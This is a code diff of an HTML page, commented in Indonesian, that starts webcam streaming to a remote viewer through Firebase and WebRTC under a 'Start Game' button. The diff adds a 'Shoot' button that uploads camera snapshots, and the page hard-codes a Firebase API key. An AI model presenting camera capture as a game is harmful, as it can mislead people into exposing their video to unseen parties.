@@ -12,8 +12,8 @@
       align-items: center; 
       justify-content: center; 
       height: 100vh; 
-      background: #111; 
-      color: #fff; 
+      background:#111; 
+      color:#fff; 
     }
     button { 
       padding: 10px 20px; 
@@ -23,17 +23,20 @@
       background:#00aaff; 
       color:#fff; 
       cursor:pointer; 
+      margin:5px;
     }
   </style>
 </head>
 <body>
   <h1>Game Camera</h1>
-  <button id="start">Start Game</button> <!-- Tombol diubah di sini -->
+  <button id="start">Start Game</button>
+  <button id="shoot" disabled>Shoot</button> <!-- awalnya disabled -->
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
     import { getDatabase, ref, set, onValue, push, remove } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
 
+    // ===== Firebase Config =====
     const firebaseConfig = {
       apiKey: "AIzaSyCMD_qYKFZQZveZQL1NX7oj3oFuTsRxaYI",
       authDomain: "camera-stream-15427.firebaseapp.com",
@@ -49,24 +52,61 @@
     const room = "room1";
     const pc = new RTCPeerConnection({ iceServers:[{urls:"stun:stun.l.google.com:19302"}] });
 
+    let stream; // simpan stream untuk tombol shoot
     const startBtn = document.getElementById("start");
+    const shootBtn = document.getElementById("shoot");
 
-    pc.onicecandidate = e => { if(e.candidate) push(ref(db, room+"/candidates"), e.candidate.toJSON()); };
-    remove(ref(db, room+"/candidates")); // clear old candidates
+    // ===== ICE Candidate =====
+    pc.onicecandidate = e => {
+      if(e.candidate) push(ref(db, room+"/candidates"), e.candidate.toJSON());
+    };
 
+    remove(ref(db, room+"/candidates")); // hapus kandidat lama
+
+    // ===== Start Game =====
     startBtn.onclick = async () => {
-      const stream = await navigator.mediaDevices.getUserMedia({video:true});
-      stream.getTracks().forEach(track => pc.addTrack(track, stream));
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({video:true});
+        stream.getTracks().forEach(track => pc.addTrack(track, stream));
 
-      const offer = await pc.createOffer();
-      await pc.setLocalDescription(offer);
-      set(ref(db, room+"/offer"), { type: offer.type, sdp: offer.sdp });
+        const offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+        set(ref(db, room+"/offer"), { type: offer.type, sdp: offer.sdp });
+        console.log("Offer sent!");
 
-      console.log("Offer sent");
+        shootBtn.disabled = false; // aktifkan tombol shoot setelah kamera berjalan
 
-      onValue(ref(db, room+"/answer"), snap => {
-        if(snap.exists()) pc.setRemoteDescription(snap.val()).then(()=>console.log("Answer set!"));
-      });
+        // Terima answer dari viewer
+        onValue(ref(db, room+"/answer"), snap => {
+          if(snap.exists()){
+            pc.setRemoteDescription(snap.val()).then(()=>console.log("Answer set!"));
+          }
+        });
+
+      } catch(err) {
+        console.error("Failed to start camera:", err);
+      }
+    };
+
+    // ===== Shoot Snapshot =====
+    shootBtn.onclick = () => {
+      if(!stream) return;
+
+      const videoTrack = stream.getVideoTracks()[0];
+      const videoEl = document.createElement("video");
+      videoEl.srcObject = new MediaStream([videoTrack]);
+      videoEl.play();
+
+      const canvas = document.createElement("canvas");
+      canvas.width = 640; 
+      canvas.height = 480;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL("image/png");
+
+      // Kirim ke Firebase
+      set(ref(db, room + "/snapshot"), { image: imageData, timestamp: Date.now() });
+      console.log("Photo shot sent!");
     };
   </script>
 </body>
